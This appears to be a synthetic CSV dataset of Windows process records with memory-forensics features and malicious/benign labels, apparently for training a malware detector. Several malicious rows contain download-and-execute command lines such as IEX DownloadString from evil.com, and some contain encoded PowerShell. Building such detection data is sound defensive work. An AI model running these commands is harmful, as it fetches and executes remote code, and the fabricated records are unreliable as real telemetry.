process_name,pid,ppid,cmd_line,cmd_line_length,num_threads,num_handles,working_set_mb,private_bytes_mb,session_id,is_signed,num_loaded_dlls,has_network_conn,num_network_conns,writable_exec_sections,private_memory_ratio,heap_executable,vad_count,suspicious_parent,process_hollowing,dll_injection,reflective_load,encoded_powershell,lolbin_usage,wmi_execution,unusual_thread_start,yara_hits,memory_anomaly_score,label
powershell.exe,8003,1253,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...o3i6a0D6c9/5/jhF0UQqVw+qpt4WbpHOwKO8ZqvEen0gwQWY6=nn/B0L7MRJvgaPkf1azoatTkS0h2CG+v3PuIUbcW97KBgZJl5FNnHHX9aJAP7drs84rurlz7uG,192,2,96,73.69,26.71,1,1,55,1,1,1,0.704,1,101,1,0,0,0,1,1,0,0,4,0.6975,1
wmiprvse.exe,8739,6853,wmiprvse.exe -secured -Embedding,43,7,256,116.43,68.36,1,1,36,0,0,3,0.759,0,78,1,0,0,0,0,0,1,0,1,0.5804,1
powershell.exe,8731,9943,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...vrm=AxuBRzcFukzvm8Pvi2AvkjJBrumk2st4b=4Szk3HFU0118f+9HubxENk1ltgLNd27adFdr/WEm8ep+7N4L7hJINe2LwZA=RLDy4H0w/1FDMpHFhpmkKWs8ok=hSQ2iuWLb1cOReYX8Mdj1,229,9,163,99.36,13.28,1,1,31,1,5,1,0.751,1,67,0,0,0,0,1,1,0,0,4,0.7462,1
taskmgr.exe,2120,3444,C:\Windows\System32\taskmgr.exe,82,26,493,130.69,70.14,1,1,29,0,0,0,0.307,0,109,0,0,0,0,0,0,0,0,0,0.016,0
OneDrive.exe,2380,1135,C:\Windows\System32\OneDrive.exe,83,20,397,38.82,55.79,1,1,16,0,0,0,0.249,0,60,0,0,0,0,0,0,0,0,0,0.074,0
explorer.exe,5481,6381,C:\Windows\Explorer.EXE,119,28,292,92.22,9.73,1,1,38,0,0,0,0.088,0,76,0,0,0,0,0,0,0,0,0,0.1127,0
calc.exe,868,4727,C:\Windows\System32\calc.exe,65,4,139,105.41,88.7,1,0,14,1,8,4,0.938,1,172,1,1,0,0,0,0,0,1,3,0.8598,1
spoolsv.exe,9901,2603,C:\Windows\System32\spoolsv.exe,117,14,107,26.82,89.71,1,1,75,0,0,0,0.323,0,35,0,0,0,0,0,0,0,0,0,0.0325,0
chrome.exe,4593,4294,chrome.exe --type=renderer --disable-gpu,46,5,164,27.87,94.41,1,1,35,1,5,0,0.304,0,83,0,0,0,0,0,0,0,0,0,0.0053,0
cscript.exe,2227,600,cscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),102,1,85,21.9,7.56,1,1,11,1,2,0,0.748,0,45,1,0,0,0,1,1,0,0,2,0.5121,1
WmiPrvSE.exe,6455,5304,wmiprvse.exe -secured -Embedding,81,3,87,101.27,67.18,1,1,29,0,2,3,0.461,1,105,1,0,0,0,0,0,1,0,2,0.615,1
SearchIndexer.exe,2919,2646,C:\Windows\System32\SearchIndexer.exe,53,9,289,86.44,12.94,0,1,10,0,0,0,0.307,0,58,0,0,0,0,0,0,0,0,0,0.0211,0
svchost.exe,2034,1281,C:\Windows\System32\svchost.exe,49,17,125,252.52,133.5,1,0,139,1,3,5,0.622,1,193,0,0,1,0,0,0,0,0,3,0.6362,1
firefox.exe,6702,769,C:\Windows\System32\firefox.exe,32,29,114,27.99,67.98,0,1,77,0,15,0,0.206,0,73,0,0,0,0,0,0,0,0,0,0.0089,0
services.exe,6796,8281,C:\Windows\System32\services.exe,95,25,342,180.97,92.87,1,1,49,0,0,0,0.175,0,85,0,0,0,0,0,0,0,0,0,0.1229,0
wininit.exe,1175,3577,C:\Windows\System32\wininit.exe,85,19,239,199.53,11.89,0,1,23,0,0,0,0.309,0,105,0,0,0,0,0,0,0,0,0,0.083,0
System,4,6253,C:\Windows\System32\System,52,14,154,132.44,77.24,1,1,18,0,0,0,0.066,0,56,0,0,0,0,0,0,0,0,0,0.0257,0
smss.exe,6496,4,C:\Windows\System32\smss.exe,104,15,59,154.79,52.87,1,1,11,0,0,0,0.177,0,115,0,0,0,0,0,0,0,0,0,0.1182,0
SearchIndexer.exe,2525,1308,C:\Windows\System32\SearchIndexer.exe,76,18,50,173.35,43.23,0,1,41,0,0,0,0.075,0,41,0,0,0,0,0,0,0,0,0,0.0256,0
firefox.exe,8443,5225,C:\Windows\System32\firefox.exe,40,12,253,127.27,34.66,0,1,36,1,19,0,0.276,0,70,0,0,0,0,0,0,0,0,0,0.0427,0
wmiprvse.exe,7968,6238,wmiprvse.exe -secured -Embedding,71,6,111,54.19,48.01,1,1,28,1,0,2,0.76,0,166,1,0,0,0,0,0,1,0,1,0.5022,1
calc.exe,9173,1968,C:\Windows\System32\calc.exe,83,24,491,94.33,89.73,0,1,40,0,0,0,0.068,0,100,0,0,0,0,0,0,0,0,0,0.0972,0
svchost.exe,4625,3778,C:\Windows\system32\svchost.exe -k netsvcs,33,9,77,86.75,39.33,1,1,37,0,0,0,0.134,0,34,0,0,0,0,0,0,0,0,0,0.1261,0
wininit.exe,8846,1840,C:\Windows\System32\wininit.exe,84,37,195,95.34,84.1,0,1,55,0,0,0,0.055,0,27,0,0,0,0,0,0,0,0,0,0.0037,0
svchost.exe,6587,5236,C:\Windows\system32\svchost.exe -k netsvcs,22,20,156,92.08,85.05,0,1,71,0,0,0,0.099,0,100,0,0,0,0,0,0,0,0,0,0.101,0
calc.exe,6422,6820,C:\Windows\System32\calc.exe,75,23,351,20.3,2.43,1,1,11,0,0,0,0.159,0,48,0,0,0,0,0,0,0,0,0,0.0821,0
winlogon.exe,6130,8889,C:\Windows\System32\winlogon.exe,40,21,129,27.8,86.1,0,1,29,0,0,0,0.158,0,44,0,0,0,0,0,0,0,0,0,0.0536,0
calc.exe,1659,5485,C:\Windows\System32\calc.exe,58,3,160,196.78,53.38,1,1,46,0,0,0,0.229,0,100,0,0,0,0,0,0,0,0,0,0.1175,0
MsMpEng.exe,2043,2057,"""C:\Program Files\Windows Defender\MsMpEng.exe""",58,10,189,61.06,4.57,0,1,25,0,0,0,0.313,0,51,0,0,0,0,0,0,0,0,0,0.1368,0
svchost.exe,3100,1836,wmiprvse.exe -secured -Embedding,68,8,125,68.11,65.77,1,1,40,1,3,2,0.538,1,160,1,0,0,0,0,0,1,0,2,0.5672,1
powershell.exe,6595,3874,powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...5hxlbxvQHnQjET2bWpB43C9DSTd/QwIkB3ccO+6jzJTWL76tX75yUN1U=MdW28qQ0bhuZoOleM8j7kn7,168,5,136,85.84,66.55,1,1,50,1,4,2,0.63,1,72,1,0,0,0,1,1,0,0,2,0.774,1
MsMpEng.exe,7531,7620,"""C:\Program Files\Windows Defender\MsMpEng.exe""",95,27,424,48.18,6.76,1,1,59,0,0,0,0.222,0,105,0,0,0,0,0,0,0,0,0,0.0622,0
mspaint.exe,976,9656,C:\Windows\System32\mspaint.exe,71,7,115,84.68,45.84,1,0,7,1,1,3,0.704,1,67,1,1,0,0,0,0,0,1,4,0.9106,1
wininit.exe,6665,8777,C:\Windows\System32\wininit.exe,44,26,353,23.03,25.62,0,1,15,0,0,0,0.279,0,49,0,0,0,0,0,0,0,0,0,0.1315,0
calc.exe,9190,3678,C:\Windows\System32\calc.exe,63,7,141,132.78,45.55,1,0,4,1,1,4,0.758,1,168,1,1,0,0,0,0,0,1,3,0.773,1
svchost.exe,8279,1755,C:\Windows\system32\svchost.exe -k netsvcs,28,7,473,34.77,72.5,1,1,59,0,0,0,0.319,0,39,0,0,0,0,0,0,0,0,0,0.0039,0
notepad.exe,3068,638,C:\Windows\System32\notepad.exe,46,30,497,198.07,52.91,0,1,52,0,0,0,0.308,0,60,0,0,0,0,0,0,0,0,0,0.0306,0
chrome.exe,6786,8644,chrome.exe --type=renderer --disable-gpu,71,10,82,85.38,28.13,0,1,75,0,17,0,0.231,0,59,0,0,0,0,0,0,0,0,0,0.033,0
SearchIndexer.exe,7330,4263,C:\Windows\System32\SearchIndexer.exe,97,21,476,55.4,3.43,0,1,29,0,0,0,0.263,0,28,0,0,0,0,0,0,0,0,0,0.054,0
explorer.exe,9097,9479,C:\Windows\Explorer.EXE,110,14,257,17.15,2.07,1,1,40,0,0,0,0.198,0,69,0,0,0,0,0,0,0,0,0,0.0852,0
spoolsv.exe,9313,2681,C:\Windows\System32\spoolsv.exe,115,22,140,198.07,14.59,1,1,42,0,0,0,0.168,0,64,0,0,0,0,0,0,0,0,0,0.012,0
svchost.exe,8000,3952,C:\Windows\System32\svchost.exe,30,19,177,171.89,171.4,1,0,127,0,4,5,0.918,1,90,0,0,1,0,0,0,0,0,2,0.6426,1
wininit.exe,969,6600,C:\Windows\System32\wininit.exe,22,28,87,27.08,12.81,1,1,47,0,0,0,0.169,0,112,0,0,0,0,0,0,0,0,0,0.0451,0
MsMpEng.exe,4687,2367,"""C:\Program Files\Windows Defender\MsMpEng.exe""",93,32,244,157.17,2.27,0,1,54,0,0,0,0.299,0,30,0,0,0,0,0,0,0,0,0,0.1195,0
wininit.exe,7374,7427,C:\Windows\System32\wininit.exe,118,31,323,151.09,66.08,1,1,39,0,0,0,0.138,0,113,0,0,0,0,0,0,0,0,0,0.0388,0
spoolsv.exe,4285,7744,C:\Windows\System32\spoolsv.exe,95,25,388,176.07,87.65,1,1,8,0,0,0,0.337,0,92,0,0,0,0,0,0,0,0,0,0.0268,0
smss.exe,7674,4,C:\Windows\System32\smss.exe,113,9,56,189.9,66.29,0,1,78,0,0,0,0.341,0,98,0,0,0,0,0,0,0,0,0,0.0347,0
explorer.exe,3634,7569,C:\Windows\Explorer.EXE,94,21,402,114.42,10.91,1,1,72,0,0,0,0.31,0,106,0,0,0,0,0,0,0,0,0,0.015,0
spoolsv.exe,5308,3791,C:\Windows\System32\spoolsv.exe,102,30,401,86.21,63.97,0,1,69,0,0,0,0.239,0,50,0,0,0,0,0,0,0,0,0,0.0994,0
explorer.exe,9178,7433,C:\Windows\Explorer.EXE,62,12,460,184.04,65.26,1,1,13,0,0,0,0.195,0,91,0,0,0,0,0,0,0,0,0,0.1327,0
winlogon.exe,6257,5673,C:\Windows\System32\winlogon.exe,87,17,286,30.4,91.96,0,1,13,0,0,0,0.239,0,22,0,0,0,0,0,0,0,0,0,0.0219,0
chrome.exe,2291,7605,chrome.exe --type=renderer --disable-gpu,114,11,393,22.52,89.95,1,1,60,1,7,0,0.201,0,74,0,0,0,0,0,0,0,0,0,0.0036,0
chrome.exe,4230,4143,chrome.exe --type=renderer --disable-gpu,23,3,197,141.25,69.58,0,1,24,0,2,0,0.166,0,117,0,0,0,0,0,0,0,0,0,0.105,0
SearchIndexer.exe,2427,3541,C:\Windows\System32\SearchIndexer.exe,55,20,363,169.26,72.23,0,1,18,0,0,0,0.16,0,69,0,0,0,0,0,0,0,0,0,0.103,0
OneDrive.exe,7233,1427,C:\Windows\System32\OneDrive.exe,90,21,293,39.46,68.12,1,1,10,1,0,0,0.288,0,41,0,0,0,0,0,0,0,0,0,0.0653,0
svchost.exe,3154,4342,C:\Windows\System32\svchost.exe,50,17,249,87.34,168.88,1,0,103,1,2,3,0.581,1,123,0,0,1,1,0,0,0,0,3,0.7078,1
OneDrive.exe,4693,9676,C:\Windows\System32\OneDrive.exe,66,3,118,44.84,6.95,1,1,13,0,0,0,0.134,0,117,0,0,0,0,0,0,0,0,0,0.0461,0
RuntimeBroker.exe,2213,9972,C:\Windows\System32\RuntimeBroker.exe,60,13,492,190.0,99.19,1,1,38,0,0,0,0.103,0,67,0,0,0,0,0,0,0,0,0,0.0732,0
services.exe,4436,3386,C:\Windows\System32\services.exe,116,1,243,87.07,25.68,1,1,63,0,0,0,0.282,0,77,0,0,0,0,0,0,0,0,0,0.1253,0
wininit.exe,1229,8027,C:\Windows\System32\wininit.exe,115,14,211,125.1,94.54,0,1,54,0,0,0,0.336,0,55,0,0,0,0,0,0,0,0,0,0.0928,0
cscript.exe,8727,2962,cscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),91,4,35,59.14,38.25,1,1,32,1,1,1,0.616,1,93,1,0,0,0,0,1,0,0,3,0.5131,1
certutil.exe,7741,7458,certutil.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),122,4,28,39.71,59.62,1,1,27,1,2,1,0.565,0,47,1,0,0,0,1,1,0,0,4,0.5187,1
WmiPrvSE.exe,822,3347,wmiprvse.exe -secured -Embedding,35,11,209,44.1,34.51,1,1,26,0,3,1,0.528,0,98,1,0,0,0,0,0,1,0,3,0.5394,1
RuntimeBroker.exe,8465,1066,C:\Windows\System32\RuntimeBroker.exe,27,29,250,186.21,61.42,0,1,7,0,0,0,0.097,0,106,0,0,0,0,0,0,0,0,0,0.1464,0
notepad.exe,3870,2251,C:\Windows\System32\notepad.exe,72,10,284,117.31,52.17,1,1,26,0,0,0,0.117,0,75,0,0,0,0,0,0,0,0,0,0.1021,0
taskmgr.exe,1174,2580,C:\Windows\System32\taskmgr.exe,33,17,269,114.92,99.91,0,1,58,0,0,0,0.305,0,56,0,0,0,0,0,0,0,0,0,0.0763,0
smss.exe,6741,4,C:\Windows\System32\smss.exe,27,39,252,62.88,68.92,1,1,15,0,0,0,0.166,0,90,0,0,0,0,0,0,0,0,0,0.0961,0
powershell.exe,6713,819,powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY...4dSw7b4PByGvG6c6TZVCdxfQxDvYJAOddA31kOGaTqZKlygTs9cBpiHLI2CQrj6TiLNSkUSgYmvjeZEyoD=MLfbaE7hwoXNQ=DcvIS06mbaI/DThSV/AkyKnNMaZ7OiUb49+kIDzJKObgUmG,212,3,168,45.5,39.77,1,1,56,1,2,1,0.814,1,71,1,0,0,0,1,1,0,0,2,0.655,1
calc.exe,5551,8989,C:\Windows\System32\calc.exe,81,24,406,117.34,1.44,1,1,47,0,0,0,0.24,0,87,0,0,0,0,0,0,0,0,0,0.0621,0
notepad.exe,7209,6289,C:\Windows\System32\notepad.exe,106,22,292,164.02,9.73,0,1,34,0,0,0,0.271,0,78,0,0,0,0,0,0,0,0,0,0.1128,0
MsMpEng.exe,1808,4425,"""C:\Program Files\Windows Defender\MsMpEng.exe""",38,39,193,3.43,13.0,0,1,34,0,0,0,0.153,0,75,0,0,0,0,0,0,0,0,0,0.141,0
OneDrive.exe,4903,2058,C:\Windows\System32\OneDrive.exe,45,14,324,56.84,33.39,0,1,67,0,0,0,0.294,0,23,0,0,0,0,0,0,0,0,0,0.1043,0
svchost.exe,3947,475,C:\Windows\System32\svchost.exe,50,4,121,51.89,35.96,1,0,11,1,3,3,0.608,1,168,1,1,0,0,0,0,0,1,5,0.9659,1
svchost.exe,4938,969,wmiprvse.exe -secured -Embedding,81,8,202,51.72,89.88,1,1,45,0,3,2,0.702,0,134,0,0,0,0,0,0,1,0,3,0.5551,1
explorer.exe,8987,7696,C:\Windows\System32\explorer.exe,35,13,295,128.38,56.68,1,0,95,1,0,6,0.677,1,158,0,0,1,1,0,0,0,0,2,0.8896,1
calc.exe,9092,7787,C:\Windows\System32\calc.exe,67,6,178,67.67,84.65,1,1,44,0,0,0,0.303,0,23,0,0,0,0,0,0,0,0,0,0.1429,0
chrome.exe,5651,7443,chrome.exe --type=renderer --disable-gpu,28,13,248,148.84,24.09,1,1,67,0,11,0,0.278,0,116,0,0,0,0,0,0,0,0,0,0.0749,0
WmiPrvSE.exe,7580,1038,wmiprvse.exe -secured -Embedding,41,5,268,75.71,34.32,1,1,36,0,0,1,0.642,0,144,1,0,0,0,0,0,1,0,3,0.5307,1
csrss.exe,8416,9926,C:\Windows\System32\csrss.exe,79,34,430,116.23,40.6,0,1,23,0,0,0,0.181,0,28,0,0,0,0,0,0,0,0,0,0.0764,0
calc.exe,6726,2505,C:\Windows\System32\calc.exe,49,6,101,25.06,37.35,1,0,6,1,7,1,0.609,1,163,1,1,0,0,0,0,0,1,2,0.9414,1
taskmgr.exe,2782,8910,C:\Windows\System32\taskmgr.exe,111,8,308,95.52,53.4,0,1,10,0,0,0,0.319,0,65,0,0,0,0,0,0,0,0,0,0.0822,0
conhost.exe,1292,4567,C:\Windows\System32\conhost.exe,74,18,252,111.36,6.85,0,1,69,0,0,0,0.239,0,102,0,0,0,0,0,0,0,0,0,0.1137,0
cscript.exe,6949,6305,cscript.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),90,2,75,69.28,24.98,1,1,33,1,2,2,0.636,1,61,1,0,0,0,0,1,0,0,2,0.7437,1
MsMpEng.exe,3216,7830,"""C:\Program Files\Windows Defender\MsMpEng.exe""",32,28,495,69.63,9.49,0,1,36,0,0,0,0.097,0,69,0,0,0,0,0,0,0,0,0,0.0648,0
powershell.exe,5746,5624,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...ro2FN/hbYW2yeaGV9EDYb3wxlehPoypVbQO6jU0u/w9wlifPZrNlrXL2DqjpY,144,9,71,60.61,36.99,1,1,51,1,1,2,0.847,0,87,0,0,0,0,1,1,0,0,3,0.7098,1
calc.exe,847,5563,C:\Windows\System32\calc.exe,32,7,172,26.74,90.51,1,0,9,1,8,1,0.751,1,158,1,1,0,0,0,0,0,1,5,0.6821,1
explorer.exe,7162,4467,C:\Windows\Explorer.EXE,64,10,441,144.02,5.21,1,1,74,0,0,0,0.058,0,26,0,0,0,0,0,0,0,0,0,0.0899,0
lsass.exe,3228,1388,C:\Windows\System32\lsass.exe,24,9,338,109.66,7.99,0,1,55,0,0,0,0.143,0,106,0,0,0,0,0,0,0,0,0,0.0233,0
lsass.exe,5177,685,C:\Windows\System32\lsass.exe,114,13,179,106.23,50.31,0,1,77,0,0,0,0.168,0,20,0,0,0,0,0,0,0,0,0,0.1393,0
lsass.exe,466,618,C:\Windows\System32\lsass.exe,55,12,269,158.32,32.13,1,1,60,0,0,0,0.094,0,20,0,0,0,0,0,0,0,0,0,0.0563,0
conhost.exe,6700,8565,C:\Windows\System32\conhost.exe,113,27,461,6.28,74.47,1,1,16,0,0,0,0.199,0,105,0,0,0,0,0,0,0,0,0,0.0699,0
explorer.exe,2317,1409,C:\Windows\Explorer.EXE,54,24,300,131.14,89.93,1,1,18,0,0,0,0.088,0,92,0,0,0,0,0,0,0,0,0,0.1049,0
csrss.exe,3081,9303,C:\Windows\System32\csrss.exe,47,16,496,47.55,6.3,1,1,69,0,0,0,0.138,0,48,0,0,0,0,0,0,0,0,0,0.0993,0
wininit.exe,5680,9561,C:\Windows\System32\wininit.exe,44,24,207,100.56,15.74,1,1,48,0,0,0,0.068,0,70,0,0,0,0,0,0,0,0,0,0.1389,0
taskmgr.exe,6091,8794,C:\Windows\System32\taskmgr.exe,58,23,93,53.97,50.46,1,1,37,0,0,0,0.214,0,25,0,0,0,0,0,0,0,0,0,0.0338,0
WmiPrvSE.exe,4160,797,wmiprvse.exe -secured -Embedding,70,6,219,20.97,19.81,1,1,22,1,2,1,0.737,1,80,1,0,0,0,0,0,1,0,1,0.7318,1
mspaint.exe,7728,2235,C:\Windows\System32\mspaint.exe,49,7,190,67.26,98.1,1,0,3,1,2,4,0.94,1,64,1,1,0,0,0,0,0,1,5,0.8387,1
services.exe,9230,5785,C:\Windows\System32\services.exe,40,35,91,103.05,52.3,1,1,48,0,0,0,0.316,0,42,0,0,0,0,0,0,0,0,0,0.146,0
RuntimeBroker.exe,5859,6230,C:\Windows\System32\RuntimeBroker.exe,89,8,388,20.08,64.2,0,1,24,0,0,0,0.245,0,81,0,0,0,0,0,0,0,0,0,0.116,0
powershell.exe,2899,7101,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...TuLKcFYeyI+ABu0yeCX76MeiZIa/c2NHw/+MlZWYN3hj9gGNW3dIySmZ=/4sNp9VZh8X3Dl104fHOMqrHhAMuixqB=Edom9Oklmh84,185,6,76,53.65,27.37,1,1,34,1,2,1,0.702,1,104,0,0,0,0,1,1,0,0,4,0.6774,1
smss.exe,6491,4,C:\Windows\System32\smss.exe,49,1,391,69.39,36.75,0,1,79,0,0,0,0.217,0,21,0,0,0,0,0,0,0,0,0,0.0965,0
SearchIndexer.exe,8816,4389,C:\Windows\System32\SearchIndexer.exe,41,27,103,61.66,47.41,1,1,5,0,0,0,0.326,0,59,0,0,0,0,0,0,0,0,0,0.1024,0
svchost.exe,491,9926,C:\Windows\system32\svchost.exe -k netsvcs,52,7,400,172.27,25.04,1,1,55,0,0,0,0.089,0,107,0,0,0,0,0,0,0,0,0,0.0208,0
RuntimeBroker.exe,4135,2292,C:\Windows\System32\RuntimeBroker.exe,118,4,332,140.55,79.17,0,1,78,0,0,0,0.094,0,79,0,0,0,0,0,0,0,0,0,0.1122,0
svchost.exe,967,7463,C:\Windows\system32\svchost.exe -k netsvcs,115,7,69,110.96,64.41,1,1,7,0,0,0,0.203,0,62,0,0,0,0,0,0,0,0,0,0.0271,0
smss.exe,5895,4,C:\Windows\System32\smss.exe,87,10,238,43.03,13.29,1,1,33,0,0,0,0.223,0,108,0,0,0,0,0,0,0,0,0,0.0916,0
MsMpEng.exe,9501,7804,"""C:\Program Files\Windows Defender\MsMpEng.exe""",33,18,93,182.74,63.91,1,1,41,0,0,0,0.195,0,42,0,0,0,0,0,0,0,0,0,0.0519,0
calc.exe,5438,8521,C:\Windows\System32\calc.exe,61,9,323,88.58,65.15,1,1,72,0,0,0,0.29,0,38,0,0,0,0,0,0,0,0,0,0.0388,0
powershell.exe,9851,4015,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...f8T4ANfT03GT=Iptv3dll7koJn/EEby0Aq0rzDPDo3B1lSgWKuHv26wQbPfZ5/0PcRHrdqmAYqvNgzNB0YKdK4pp8CDLkx8Vqmqa=3ne3TgA6iJ+n3LFu0,201,6,108,95.23,21.13,1,1,49,1,2,0,0.71,0,128,1,0,0,0,1,1,0,0,3,0.8076,1
svchost.exe,4020,5515,C:\Windows\System32\svchost.exe,31,9,147,117.78,60.41,1,0,94,1,0,7,0.665,1,207,0,0,1,1,0,0,0,0,1,0.7767,1
spoolsv.exe,7385,1727,C:\Windows\System32\spoolsv.exe,47,8,296,145.3,51.16,0,1,6,0,0,0,0.099,0,24,0,0,0,0,0,0,0,0,0,0.1403,0
winlogon.exe,7058,2970,C:\Windows\System32\winlogon.exe,97,35,319,136.54,28.3,0,1,47,0,0,0,0.122,0,44,0,0,0,0,0,0,0,0,0,0.129,0
smss.exe,2212,4,C:\Windows\System32\smss.exe,83,35,157,63.5,53.91,0,1,6,0,0,0,0.193,0,53,0,0,0,0,0,0,0,0,0,0.0396,0
SearchIndexer.exe,2503,9915,C:\Windows\System32\SearchIndexer.exe,59,4,122,128.21,78.4,0,1,20,0,0,0,0.325,0,81,0,0,0,0,0,0,0,0,0,0.1273,0
smss.exe,4250,4,C:\Windows\System32\smss.exe,73,5,393,168.3,39.96,0,1,73,0,0,0,0.124,0,59,0,0,0,0,0,0,0,0,0,0.0737,0
explorer.exe,9313,7209,C:\Windows\Explorer.EXE,29,4,286,91.64,69.35,0,1,6,0,0,0,0.131,0,22,0,0,0,0,0,0,0,0,0,0.1365,0
notepad.exe,1216,1645,C:\Windows\System32\notepad.exe,42,8,74,152.41,64.27,1,1,9,0,0,0,0.149,0,87,0,0,0,0,0,0,0,0,0,0.097,0
firefox.exe,8339,3072,C:\Windows\System32\firefox.exe,91,25,227,64.51,61.07,1,1,48,0,8,0,0.231,0,77,0,0,0,0,0,0,0,0,0,0.0701,0
spoolsv.exe,1038,9764,C:\Windows\System32\spoolsv.exe,57,17,497,70.05,64.0,0,1,57,0,0,0,0.169,0,54,0,0,0,0,0,0,0,0,0,0.006,0
MsMpEng.exe,9307,6578,"""C:\Program Files\Windows Defender\MsMpEng.exe""",85,11,468,101.64,82.04,0,1,54,0,0,0,0.263,0,41,0,0,0,0,0,0,0,0,0,0.1313,0
mspaint.exe,8098,3735,C:\Windows\System32\mspaint.exe,46,4,118,111.33,68.52,1,0,12,1,5,4,0.838,1,186,1,1,0,0,0,0,0,1,5,0.8936,1
OneDrive.exe,7942,8743,C:\Windows\System32\OneDrive.exe,67,3,52,181.63,7.57,1,1,38,0,0,0,0.207,0,40,0,0,0,0,0,0,0,0,0,0.042,0
wmiprvse.exe,8896,4548,wmiprvse.exe -secured -Embedding,81,8,124,111.29,67.14,1,1,24,1,1,1,0.795,0,125,1,0,0,0,0,0,1,0,3,0.8008,1
powershell.exe,7223,8028,powershell.exe -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA...PzEXf/kmhuJPA3Pc0LQOYDsEgl+srxesDfl2OBGu9Ju=uqy5MQ123ww+gCvxKm=Bh/bWpHveH7=v,159,3,52,76.39,32.78,1,1,21,1,2,2,0.679,0,105,0,0,0,0,1,1,0,0,2,0.701,1
WmiPrvSE.exe,6078,9885,wmiprvse.exe -secured -Embedding,64,6,162,42.54,64.61,1,1,47,0,1,1,0.755,1,109,1,0,0,0,0,0,1,0,2,0.7759,1
SearchIndexer.exe,4094,615,C:\Windows\System32\SearchIndexer.exe,37,17,155,149.17,45.56,1,1,73,0,0,0,0.168,0,112,0,0,0,0,0,0,0,0,0,0.0848,0
System,4,6625,C:\Windows\System32\System,65,18,472,5.37,98.1,0,1,68,0,0,0,0.228,0,45,0,0,0,0,0,0,0,0,0,0.045,0
msiexec.exe,834,2647,msiexec.exe -c IEX(New-Object Net.WebClient).DownloadString(http://evil.com/ps.txt),168,1,100,36.38,48.58,1,1,25,1,3,0,0.419,0,93,1,0,0,0,1,1,0,0,2,0.824,1
svchost.exe,2034,2849,C:\Windows\system32\svchost.exe -k netsvcs,25,21,215,130.76,35.03,0,1,39,0,0,0,0.187,0,103,0,0,0,0,0,0,0,0,0,0.0645,0
winlogon.exe,1620,8652,C:\Windows\System32\winlogon.exe,35,10,351,88.37,73.55,1,1,70,0,0,0,0.278,0,115,0,0,0,0,0,0,0,0,0,0.1132,0
chrome.exe,1759,5602,chrome.exe --type=renderer --disable-gpu,101,1,334,24.96,65.62,0,1,36,0,14,0,0.066,0,28,0,0,0,0,0,0,0,0,0,0.0217,0
SearchIndexer.exe,2097,3938,C:\Windows\System32\SearchIndexer.exe,67,26,219,82.84,40.52,1,1,67,0,0,0,0.174,0,37,0,0,0,0,0,0,0,0,0,0.118,0
notepad.exe,2573,5714,C:\Windows\System32\notepad.exe,70,20,432,199.77,22.78,1,1,26,0,0,0,0.125,0,88,0,0,0,0,0,0,0,0,0,0.0874,0
notepad.exe,3682,956,C:\Windows\System32\notepad.exe,40,6,376,120.29,95.34,1,1,42,0,0,0,0.14,0,112,0,0,0,0,0,0,0,0,0,0.0539,0
notepad.exe,868,6442,C:\Windows\System32\notepad.exe,43,13,249,163.5,14.8,1,1,30,0,0,0,0.13,0,106,0,0,0,0,0,0,0,0,0,0.1139,0
notepad.exe,5896,9269,C:\Windows\System32\notepad.exe,49,13,153,123.8,87.6,1,0,146,0,1,4,0.554,1,246,0,0,1,0,0,0,0,0,3,0.8102,1
